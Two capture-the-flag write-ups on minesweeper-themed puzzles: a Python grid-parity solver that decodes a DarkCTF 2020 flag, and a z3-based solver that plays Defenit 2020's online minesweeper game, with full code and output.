83, 75, 113, 109, 71, 127, 127, 85, 71, 125, 67, 69, 113, 111, 79, 111, 123,
113, 93, 107, 127, 113, 105, 73, 65, 67, 91, 113, 87, 113, 79, 89, 105, 95,
73, 95, 79, 71], [117, 115, 93, 69, 85, 65, 83, 101, 75, 127, 99, 93, 99, 113,
81, 91, 77, 93, 81, 87, 117, 93, 109, 121, 105, 127, 85, 79, 79, 117, 79, 125,
125, 69, 117, 95, 73, 121, 107, 107], [117, 115, 93, 69, 85, 65, 83, 101, 75,
127, 99, 93, 99, 113, 81, 91, 77, 93, 81, 87, 117, 93, 109, 121, 105, 127, 85,
79, 79, 117, 79, 125, 125, 69, 117, 95, 73, 121, 107, 107], [117, 115, 93, 69,
85, 65, 83, 101, 75, 127, 99, 93, 99, 113, 81, 91, 77, 93, 81, 87, 117, 93,
109, 121, 105, 127, 85, 79, 79, 117, 79, 125, 125, 69, 117, 95, 73, 121, 107,
107], [117, 115, 93, 69, 85, 65, 83, 101, 75, 127, 99, 93, 99, 113, 81, 91,
77, 93, 81, 87, 117, 93, 109, 121, 105, 127, 85, 79, 79, 117, 79, 125, 125,
69, 117, 95, 73, 121, 107, 107], [93, 69, 87, 103, 99, 127, 65, 107, 93, 113,
97, 81, 125, 127, 103, 97, 71, 125, 111, 127, 101, 73, 127, 93, 83, 105, 97,
119, 113, 109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67], [93, 69, 87, 103, 99,
127, 65, 107, 93, 113, 97, 81, 125, 127, 103, 97, 71, 125, 111, 127, 101, 73,
127, 93, 83, 105, 97, 119, 113, 109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67],
[93, 69, 87, 103, 99, 127, 65, 107, 93, 113, 97, 81, 125, 127, 103, 97, 71,
125, 111, 127, 101, 73, 127, 93, 83, 105, 97, 119, 113, 109, 73, 81, 101, 83,
73, 87, 71, 93, 73, 67], [93, 69, 87, 103, 99, 127, 65, 107, 93, 113, 97, 81,
125, 127, 103, 97, 71, 125, 111, 127, 101, 73, 127, 93, 83, 105, 97, 119, 113,
109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67], [93, 69, 87, 103, 99, 127, 65,
107, 93, 113, 97, 81, 125, 127, 103, 97, 71, 125, 111, 127, 101, 73, 127, 93,
83, 105, 97, 119, 113, 109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67]]

def check_n(r, c):  
   if r - 1 > 0:  
       if array[r - 1][c] % 2 == 0:  
           return 1  
       else:  
           return 0  
   else:  
       return 1

def check_ne(r, c):  
   if r - 1 > 0 and c + 1 < len(array[0]):  
       if array[r - 1][c + 1] % 2 == 0:  
           return 1  
       else:  
           return 0  
   else:  
       return 1

def check_e(r, c):  
   if c + 1 < len(array[0]):  
       if array[r][c + 1] % 2 == 0:  
           return 1  
       else:  
           return 0  
   else:  
       return 1

def check_se(r, c):  
   if r + 1 < len(array) and c + 1 < len(array[0]):  
       if array[r + 1][c + 1] % 2 == 0:  
           return 1  
       else:  
           return 0  
   else:  
       return 1

def check_s(r, c):  
   if r + 1 < len(array):  
       if array[r + 1][c] % 2 == 0:  
           return 1  
       else:  
           return 0  
   else:  
       return 1

def check_sw(r, c):  
   if r + 1 < len(array) and c - 1 > 0:  
       if array[r + 1][c - 1] % 2 == 0:  
           return 1  
       else:  
           return 0  
   else:  
       return 1

def check_w(r, c):  
   if c - 1 > 0:  
       if array[r][c - 1] % 2 == 0:  
           return 1  
       else:  
           return 0  
   else:  
       return 1

def check_nw(r, c):  
   if r - 1 > 0 and c - 1 > 0:  
       if array[r - 1][c - 1] % 2 == 0:  
           return 1  
       else:  
           return 0  
   else:  
       return 1

# Main execution.  
if __name__ == "__main__":  
  
   print("Misc/Minesweeper solver.")  
   print("[*] Matrix {}x{}.".format(len(array), len(array[0])))  
   values = []  
   for r in range(len(array)):  
       for c in range(len(array[r])):  
           print("{}  ".format(f"{array[r][c]:>3}"), end="")  
           all_directions_even = check_n(r, c) & check_ne(r, c) & check_e(r, c) & check_se(r, c) & check_s(r, c) & check_sw(r, c) & check_w(r, c) & check_nw(r, c)  
           if all_directions_even > 0:  
               values.append(array[r][c])  
       print()  
   print("[*] Values are: {}.".format(values))  
   converted = list(map(chr, values))  
   print("[*] Converted values are: {}.".format(converted))  
   converted.reverse()  
   flag_content = "".join(converted)  
   print("[*] Flag content is: {}.".format(flag_content))  
   flag_content = flag_content.replace("FLaGIS", "")  
   print("[*] Flag is: darkCTF{{{}}}.".format(flag_content))  
```

It will give you the flag.

```  
$ python minesweeper.py  
Misc/Minesweeper solver.  
[*] Matrix 52x40.  
93   91   95   88   42   78   93   91   93   93   83   73   75   67   79   93
79   75   97   85   83   85   79   87   93   83   69   87   77   89   79   81
67   69   75   95   89   89   93   95  
75   85   75   96   69   70   85   95   81   97   95   75   75   85   79   77
87   69   95   77   81   81   89   79   73   93   73   93   91   97   85   85
67   87   67   89   85   95   75   71  
83   89   73   80   76   72   79   73   71   71   79   91   91   69   83   89
73   67   67   85   69   85   81   89   93   75   97   77   75   83   85   79
73   75   73   79   75   83   83   69  
79   67   91   71   89   97   97   67   95   67   77   95   67   79   81   87
95   69   76   90   94   92   76   80   75   89   85   73   91   81   75   81
91   95   73   73   86   82   94   79  
79   69   83   71   95   73   75   83   97   83   97   91   75   97   79   87
87   95   90   69   90   90   67   72   67   75   89   83   91   81   89   95
69   97   69   89   70   78   62   97  
95   85   87   97   71   67   85   83   83   67   67   93   81   87   71   87
71   83   82   66   97   80   74   46   77   81   77   87   75   89   91   77
67   83   87   67   78   62   82   87  
89   79   91   96   82   92   91   85   69   79   67   91   82   78   92   89
83   95   73   68   76   76   89   87   77   97   77   94   82   94   91   77
85   81   71   95   95   93   97   95  
89   77   79   72   69   84   73   91   73   77   83   81   80   73   96   89
89   93   93   92   84   82   79   77   69   97   97   88   97   86   85   67
77   91   67   73   81   93   81   97  
69   73   67   68   92   90   71   83   79   95   91   67   86   62   78   89
85   67   81   66   92   94   93   79   89   69   85   80   88   66   87   83
69   91   81   77   95   93   69   73  
73   75   97   77   75   83   67   81   75   73   91   79   89   93   71   91
69   77   75   93   85   87   69   97   73   85   85   81   95   91   81   67
97   71   83   97   83   71   93   77  
81   91   95   89   90   86   78   67   79   67   91   89   69   95   89   97
85   85   89   82   94   84   79   71   73   77   71   85   73   95   77   77
77   95   97   83   67   83   67   93  
75   83   77   95   68   80   94   85   73   91   89   91   75   93   95   85
91   93   83   86   68   76   77   85   81   79   67   71   89   89   85   93
71   87   91   93   83   95   93   81  
69   77   97   77   82   90   70   87   93   87   97   97   89   71   69   91
95   87   67   78   78   70   67   91   71   69   77   85   85   81   81   97
71   69   87   91   91   69   81   77  
69   97   69   79   69   87   67   85   81   85   73   85   69   81   89   73
93   69   93   87   83   69   83   73   95   79   79   73   81   79   97   93
95   81   69   69   87   81   67   81  
83   83   87   77   67   97   67   91   71   81   67   83   73   77   77   67
83   83   85   77   81   91   89   67   95   87   95   87   81   93   97   77
83   91   71   89   83   71   77   69  
67   89   85   81   86   90   78   85   71   85   93   95   69   81   89   73
75   70   68   88   67   87   93   67   67   77   89   95   67   83   79   79
98   96   76   79   91   93   71   91  
81   81   83   85   76   78   80   67   85   75   93   89   95   79   91   91
75   96   97   82   85   91   69   85   75   73   83   93   89   83   91   69
72   78   72   89   73   95   67   89  
89   91   77   97   76   68   98   67   91   91   89   89   89   87   67   75
83   84   88   98   85   77   89   89   69   77   89   81   69   91   85   95
88   70   88   87   91   91   69   83  
83   84   60   82   79   91   95   67   69   73   67   97   77   75   93   71
73   75   95   87   75   95   73   93   95   80   82   88   85   77   73   75
69   95   85   77   68   78   92   81  
71   42   79   86   97   75   75   81   79   87   85   87   73   81   87   75
91   67   91   67   93   77   87   91   67   76   73   72   97   83   95   73
71   69   79   89   92   84   82   69  
67   78   74   88   77   91   67   85   87   97   69   89   69   85   85   89
81   67   97   91   71   85   91   85   75   98   82   70   69   79   75   97
97   85   95   97   94   80   64   79  
73   81   79   79   71   97   79   77   93   79   95   85   85   95   79   91
77   91   81   67   93   75   89   87   67   77   93   89   67   77   77   77
91   77   67   81   79   73   87   91  
93   92   82   88   85   95   69   79   93   89   67   72   76   88   85   77
81   87   75   83   75   95   97   77   91   93   87   87   88   62   90   85
79   93   75   89   85   64   62   98  
83   82   97   62   91   77   81   67   85   67   87   88   86   94   77   89
73   77   67   81   75   95   87   79   85   77   93   89   74   82   78   77
79   89   83   95   77   70   69   94  
85   94   92   90   71   71   89   83   77   73   93   72   98   90   83   97
89   93   95   91   77   95   93   93   69   75   75   69   74   78   72   85
97   69   83   75   75   88   90   72  
73   67   82   74   66   87   85   89   71   97   77   93   81   69   78   82
92   81   81   91   67   71   79   79   69   81   84   82   88   91   85   69
95   84   70   88   89   81   71   77  
95   87   94   83   84   69   69   97   79   73   69   91   83   89   80   66
84   93   97   77   77   91   83   69   91   91   80   79   98   91   67   91
91   70   69   72   89   77   71   83  
93   83   94   78   82   78   66   74   79   95   93   89   79   87   90   74
76   85   67   93   77   81   67   83   90   70   72   86   76   91   79   89
71   82   72   88   91   67   67   95  
85   89   73   95   83   72   86   70   91   81   81   69   87   97   97   77
77   77   87   97   91   81   93   69   66   97   84   89   89   95   77   71
85   91   95   75   67   97   71   71  
81   97   75   67   73   92   74   78   81   91   75   93   73   75   87   95
67   83   75   71   97   91   89   71   82   80   82   87   77   95   91   93
79   73   73   69   75   75   93   79  
89   71   87   89   76   70   88   83   91   73   83   91   91   93   76   84
62   75   91   69   97   93   73   95   75   73   77   67   81   72   88   80
73   73   87   75   73   75   91   95  
75   67   87   79   72   72   96   69   85   85   81   95   81   81   76   85
80   97   75   77   91   79   75   91   73   69   81   77   81   98   79   62
87   85   69   89   67   97   67   81  
77   85   73   77   82   74   90   95   69   81   71   69   73   83   80   88
84   73   75   87   70   68   84   77   83   83   77   71   85   86   80   84
93   89   73   69   85   89   91   79  
81   77   87   69   87   95   69   79   69   71   71   75   91   93   97   95
83   81   67   83   92   89   96   95   97   93   81   79   71   69   93   75
89   71   77   69   91   97   79   69  
69   87   87   85   69   83   85   77   97   89   83   67   73   83   82   74
64   95   93   87   72   68   80   92   68   92   87   85   91   85   79   91
97   97   71   93   85   89   85   85  
85   81   77   95   81   89   77   73   85   87   71   73   83   95   92   83
68   71   73   69   87   81   97   72   73   98   91   89   81   71   85   77
95   95   69   81   77   79   67   97  
69   93   75   97   67   93   77   67   75   77   79   89   71   67   76   94
80   75   81   95   67   75   71   90   74   76   87   79   71   73   79   75
73   87   81   91   95   75   95   69  
67   85   87   72   66   82   95   69   87   73   91   93   72   70   92   83
93   89   95   67   72   76   78   85   87   97   91   75   89   85   83   85
77   89   94   80   78   69   77   95  
71   95   73   76   71   66   67   97   95   75   95   87   70   97   80   77
91   91   95   87   82   76   66   93   97   69   71   91   83   89   67   93
77   85   62   70   78   97   81   93  
85   97   87   72   86   92   97   79   67   73   69   81   92   90   82   79
77   77   67   81   80   66   78   75   81   83   69   83   67   89   97   93
95   95   76   78   70   97   83   55  
93   69   87  103   99  127   65  107   93  113   97   81  125  127  103   97
71  125  111  127  101   73  127   93   83  105   97  119  113  109   73   81
101   83   73   87   71   93   73   67  
101  115   65   83   95   95  109  123   89   83   97  107  101  123  123   71
71   87   75   73   65  121   67   77   87   73   69   99   87   99  125   81
79   65  127  101  117   95  115   95  
107   99   83   75  113  109   71  127  127   85   71  125   67   69  113  111
79  111  123  113   93  107  127  113  105   73   65   67   91  113   87  113
79   89  105   95   73   95   79   71  
117  115   93   69   85   65   83  101   75  127   99   93   99  113   81   91
77   93   81   87  117   93  109  121  105  127   85   79   79  117   79  125
125   69  117   95   73  121  107  107  
117  115   93   69   85   65   83  101   75  127   99   93   99  113   81   91
77   93   81   87  117   93  109  121  105  127   85   79   79  117   79  125
125   69  117   95   73  121  107  107  
117  115   93   69   85   65   83  101   75  127   99   93   99  113   81   91
77   93   81   87  117   93  109  121  105  127   85   79   79  117   79  125
125   69  117   95   73  121  107  107  
117  115   93   69   85   65   83  101   75  127   99   93   99  113   81   91
77   93   81   87  117   93  109  121  105  127   85   79   79  117   79  125
125   69  117   95   73  121  107  107  
93   69   87  103   99  127   65  107   93  113   97   81  125  127  103   97
71  125  111  127  101   73  127   93   83  105   97  119  113  109   73   81
101   83   73   87   71   93   73   67  
93   69   87  103   99  127   65  107   93  113   97   81  125  127  103   97
71  125  111  127  101   73  127   93   83  105   97  119  113  109   73   81
101   83   73   87   71   93   73   67  
93   69   87  103   99  127   65  107   93  113   97   81  125  127  103   97
71  125  111  127  101   73  127   93   83  105   97  119  113  109   73   81
101   83   73   87   71   93   73   67  
93   69   87  103   99  127   65  107   93  113   97   81  125  127  103   97
71  125  111  127  101   73  127   93   83  105   97  119  113  109   73   81
101   83   73   87   71   93   73   67  
93   69   87  103   99  127   65  107   93  113   97   81  125  127  103   97
71  125  111  127  101   73  127   93   83  105   97  119  113  109   73   81
101   83   73   87   71   93   73   67  
[*] Values are: [69, 67, 78, 69, 73, 84, 97, 80, 68, 78, 97, 78, 79, 73, 84,
97, 86, 82, 69, 83, 66, 79, 69, 86, 97, 72, 85, 79, 89, 83, 73, 71, 97, 76,
70].  
[*] Converted values are: ['E', 'C', 'N', 'E', 'I', 'T', 'a', 'P', 'D', 'N',
'a', 'N', 'O', 'I', 'T', 'a', 'V', 'R', 'E', 'S', 'B', 'O', 'E', 'V', 'a',
'H', 'U', 'O', 'Y', 'S', 'I', 'G', 'a', 'L', 'F'].  
[*] Flag content is: FLaGISYOUHaVEOBSERVaTIONaNDPaTIENCE.  
[*] Flag is: darkCTF{YOUHaVEOBSERVaTIONaNDPaTIENCE}.  
```

Original writeup (https://github.com/m3ssap0/CTF-
Writeups/blob/master/DarkCTF%202020/Minesweeper/README.md).[original](https://gist.github.com/cwgreene/e4ca5404db149eb76afe0b3d804c738c)  
# Defenit 2020: minesweeper

So we're given a 16x16 minesweepr map, and need to beat it in  
under a minute. Time to use z3!

Z3 is a Symmetric Modulo Theory (SMT) solver. Essentially, it  
is able to solve logic puzzles. Our approach is to parse the map,  
and for each number encode that as a constraint.

Parsing the map, we first

```python  
def parse_map(grid, bombmap):  
   rows = bombmap.split("\n")  
   rows = rows[2::2]  
   counts = []  
   empties = []  
   for i, row in enumerate(rows[:-1]):  
       row = row[row.index('|'):]  
       rowcounts = row.split('|')[1:-1]  
       for j, count in enumerate(rowcounts):  
           if re.match(" *[0-9]+ *", count):  
               # Numbers are not mines, direct z3 constraint  
               BASE_CONSTRAINTS.append(grid[(i,j)]==0)  
               # Constraints  
               counts.append((i, j, int(count)))  
           elif count == "   ":  
               empties.append((i,j))  
   return counts, empties  
```

Here we also state that if you are a number, than you're automatically  
not a mine (encoded as '0'). Setting the BASE_CONSTRAINTS here is a bit  
of a hack. It would have been better to do it in the construct_constraints,  
but I had forgotten to do it the first time round and I just wanted to  
ensure that it was done.

The `counts` later get transformed into z3 constraints

```python  
def construct_constraint(grid, i, j, count):  
   neighbor_sum = 0  
   for neighbor in neighbors(i,j):  
       ix, jx = neighbor  
       neighbor_sum += grid[(ix,jx)]  
   return neighbor_sum == count  
```

We then need to find a safe square to choose. We pick one of the  
perimeter squares that is adjacent, and we test it. If we mark it  
as a mine, and it can't be, z3 will tell us this isn't satisfiable.  
This becomes one of our choices. Likewise, if it *must* be mine, we mark it  
as such. We track the known flags in a separate array FLAGGED.

```python  
def make_choice(grid, counts, empties):  
   constraints = BASE_CONSTRAINTS[:]  
   counted = set()  
   for (i,j,count) in counts:  
       counted.add((i,j))  
       constraints.append(construct_constraint(grid, i, j, count))

   choices = []  
   safe = []  
   for e in empties:  
       if not set(neighbors(*e)).intersection(counted):  
           continue  
       s = z3.Solver()  
       s.add(*constraints)  
       s.add(*FLAGGED)  
       s.add(*safe)  
       s.add(grid[e] == 1)  
       check = s.check()  
       if check == z3.unsat:  
           choices.append(e)  
           safe.append(grid[e]==0)

   flaggable = []  
   for e in empties:  
       if not set(neighbors(*e)).intersection(counted):  
           continue                                                                                                                                       
       s = z3.Solver()  
       s.add(*constraints)  
       s.add(*FLAGGED)  
       s.add(grid[e] == 0)  
       check = s.check()  
       if check == z3.unsat:  
           flaggable.append(e)  
           FLAGGED.append(grid[e] == 1)  
   return choices, set(flaggable)  
```

Then we just loop until victory.  
```python  
   while True:  
       print("Parsing...")  
       counts, empties = parse_map(grid, bombmap)  
       if not empties:  
           break  
       print("Thinking...")  
       choices, flaggable = make_choice(grid, counts, empties)  
       print("Thought!")  
       for bomb in flaggable:  
           print(convert(*bomb)+"f")  
           r.sendline(convert(*bomb)+"f")  
           bombmap = recv_map()  
           print(bombmap)  
       for choice in choices:  
           print(convert(*choice))  
           r.sendline(convert(*choice))  
           bombmap = recv_map()  
           print(bombmap)  
       if not choices:  
           print("Done!")  
           break  
```

The first time I did this, I forgot the BASE_CONSTRAINTS. Surprisingly,  
the solver was still able to work out safe moves. However, it was much  
slower. Putting the BASE_CONSTRAINTS in resulted in much faster solve times.

## Appendix A: Full code

```python  
from pwn import *

import re  
import z3

r = remote("minesweeper.ctf.defenit.kr", 3333)

BASE_CONSTRAINTS = []  
FLAGGED = []

def init_grid():  
   grid = {}  
   for i in range(16):  
       for j in range(16):  
           grid[(i,j)] = z3.Int("({},{})".format(i,j))  
           BASE_CONSTRAINTS.append(grid[(i,j)] >= 0)  
           BASE_CONSTRAINTS.append(grid[(i,j)] <= 1)  
   return grid

def recv_map():  
   print(r.recvuntil('     a'))  
   bombmap = b"     a"+ r.recvuntil('-\n\n')  
   if b'X' in bombmap:  
       print(str(bombmap, 'ascii'))  
       print(str(r.recv(), 'ascii'))  
   return str(bombmap, 'ascii')

def parse_map(grid, bombmap):  
   rows = bombmap.split("\n")  
   rows = rows[2::2]  
   counts = []  
   empties = []  
   for i, row in enumerate(rows[:-1]):  
       row = row[row.index('|'):]  
       rowcounts = row.split('|')[1:-1]  
       for j, count in enumerate(rowcounts):  
           if re.match(" *[0-9]+ *", count):  
               BASE_CONSTRAINTS.append(grid[(i,j)]==0)  
               counts.append((i, j, int(count)))  
           elif count == "   ":  
               empties.append((i,j))  
   return counts, empties

def convert(row, column):  
   c = "abcdefghijklmnopqrst"[column]  
   r = [str(i) for i in range(1,17)][row]  
   return c+r

def neighbors(i,j):  
   result = []  
   for x in [1,0,-1]:  
       for y in [1,0,-1]:  
           if x == 0 and y == 0:  
               continue  
           if (i + x >= 16) or (i + x < 0) or (j + y >= 16) or (j + y < 0):  
               continue  
           result.append((i+x, j+y))  
   return result

def construct_constraint(grid, i, j, count):  
   neighbor_sum = 0  
   for neighbor in neighbors(i,j):  
       ix, jx = neighbor  
       neighbor_sum += grid[(ix,jx)]  
   return neighbor_sum == count

def make_choice(grid, counts, empties):  
   constraints = BASE_CONSTRAINTS[:]  
   counted = set()  
   for (i,j,count) in counts:  
       counted.add((i,j))  
       constraints.append(construct_constraint(grid, i, j, count))

   choices = []  
   safe = []  
   for e in empties:  
       if not set(neighbors(*e)).intersection(counted):  
           continue  
       s = z3.Solver()  
       s.add(*constraints)  
       s.add(*FLAGGED)  
       s.add(*safe)  
       s.add(grid[e] == 1)  
       check = s.check()  
       if check == z3.unsat:  
           choices.append(e)  
           safe.append(grid[e]==0)

   flaggable = []  
   for e in empties:  
       if not set(neighbors(*e)).intersection(counted):  
           continue  
       s = z3.Solver()  
       s.add(*constraints)  
       s.add(*FLAGGED)  
       s.add(grid[e] == 0)  
       check = s.check()  
       if check == z3.unsat:  
           flaggable.append(e)  
           FLAGGED.append(grid[e] == 1)  
   return choices, set(flaggable)

def main():  
   grid = init_grid()

   bombmap = recv_map()  
   # choose 3 random spots to kick off.  
   r.sendline("a5")  
   bombmap = recv_map()  
   r.sendline("n5")  
   bombmap = recv_map()  
   r.sendline("j12")  
   bombmap = recv_map()  
   print(bombmap)  
   # main loop  
   flagged = set()  
   while True:  
       print("Parsing...")  
       counts, empties = parse_map(grid, bombmap)  
       if not empties:  
           break  
       print("Thinking...")  
       choices, flaggable = make_choice(grid, counts, empties)  
       print("Thought!")  
       for bomb in flaggable:  
           print(convert(*bomb)+"f")  
           r.sendline(convert(*bomb)+"f")  
           bombmap = recv_map()  
           print(bombmap)  
       for choice in choices:  
           print(convert(*choice))  
           r.sendline(convert(*choice))  
           bombmap = recv_map()  
           print(bombmap)  
       if not choices:  
           print("Done!")  
           break  
           #for empty in (set(empties) - flaggable):  
           #    r.sendline(convert(*empty)+"f")  
           #break  
   r.interactive()

main()  
```

# References  
1. https://yurichev.com/blog/minesweeper/